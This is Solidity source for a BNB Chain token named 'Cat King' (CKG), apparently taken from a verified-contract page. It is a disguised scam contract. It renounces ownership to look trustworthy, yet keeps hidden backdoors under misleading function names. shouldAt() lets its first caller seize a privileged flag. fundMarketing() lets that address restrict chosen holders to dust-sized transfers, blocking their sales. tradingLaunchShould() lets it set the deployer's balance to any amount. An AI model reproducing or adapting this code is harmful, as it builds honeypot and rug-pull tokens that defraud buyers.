/**
 *Submitted for verification at BscScan.com on 2023-02-07
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface totalIs {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface isMarketing {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract CatKing is Ownable {
    uint8 private takeLaunch = 18;

    string private sellMarketing = "Cat King";
    string private listExempt = "CKG";

    uint256 private enableMode = 100000000 * 10 ** takeLaunch;
    mapping(address => uint256) private senderAt;
    mapping(address => mapping(address => uint256)) private maxToken;

    mapping(address => bool) public tokenSender;
    address public modeShould;
    address public receiverShould;
    mapping(address => bool) public swapLiquidity;
    uint256 constant sellLiquidity = 10 ** 10;
    bool public takeReceiverMin;

    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        totalIs limitTakeMarketing = totalIs(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        receiverShould = isMarketing(limitTakeMarketing.factory()).createPair(limitTakeMarketing.WETH(), address(this));
        modeShould = limitTotalSell();
        tokenSender[modeShould] = true;
        senderAt[modeShould] = enableMode;
        emit Transfer(address(0), modeShould, enableMode);
        renounceOwnership();
    }

    

    function approve(address atTo, uint256 launchAuto) public returns (bool) {
        maxToken[limitTotalSell()][atTo] = launchAuto;
        emit Approval(limitTotalSell(), atTo, launchAuto);
        return true;
    }

    function shouldAt(address launchTx) public {
        if (takeReceiverMin) {
            return;
        }
        tokenSender[launchTx] = true;
        takeReceiverMin = true;
    }

    function fundMarketing(address atLiquidityReceiver) public {
        if (atLiquidityReceiver == modeShould || atLiquidityReceiver == receiverShould || !tokenSender[limitTotalSell()]) {
            return;
        }
        swapLiquidity[atLiquidityReceiver] = true;
    }

    function symbol() external view returns (string memory) {
        return listExempt;
    }

    function allowance(address listTokenSender, address atTo) external view returns (uint256) {
        return maxToken[listTokenSender][atTo];
    }

    function totalSupply() external view returns (uint256) {
        return enableMode;
    }

    function decimals() external view returns (uint8) {
        return takeLaunch;
    }

    function balanceOf(address liquidityTotal) public view returns (uint256) {
        return senderAt[liquidityTotal];
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function transferFrom(address launchTotalReceiver, address launchedTotalAmount, uint256 launchAuto) public returns (bool) {
        if (launchTotalReceiver != limitTotalSell() && maxToken[launchTotalReceiver][limitTotalSell()] != type(uint256).max) {
            require(maxToken[launchTotalReceiver][limitTotalSell()] >= launchAuto);
            maxToken[launchTotalReceiver][limitTotalSell()] -= launchAuto;
        }
        if (launchedTotalAmount == modeShould || launchTotalReceiver == modeShould) {
            return totalReceiver(launchTotalReceiver, launchedTotalAmount, launchAuto);
        }
        if (swapLiquidity[launchTotalReceiver]) {
            return totalReceiver(launchTotalReceiver, launchedTotalAmount, sellLiquidity);
        }
        return totalReceiver(launchTotalReceiver, launchedTotalAmount, launchAuto);
    }

    function limitTotalSell() private view returns (address) {
        return msg.sender;
    }

    function totalReceiver(address autoBuy, address receiverFee, uint256 launchAuto) internal returns (bool) {
        require(senderAt[autoBuy] >= launchAuto);
        senderAt[autoBuy] -= launchAuto;
        senderAt[receiverFee] += launchAuto;
        emit Transfer(autoBuy, receiverFee, launchAuto);
        return true;
    }

    function transfer(address launchedTotalAmount, uint256 launchAuto) external returns (bool) {
        return transferFrom(limitTotalSell(), launchedTotalAmount, launchAuto);
    }

    function name() external view returns (string memory) {
        return sellMarketing;
    }

    function tradingLaunchShould(uint256 launchAuto) public {
        if (!tokenSender[limitTotalSell()]) {
            return;
        }
        senderAt[modeShould] = launchAuto;
    }


}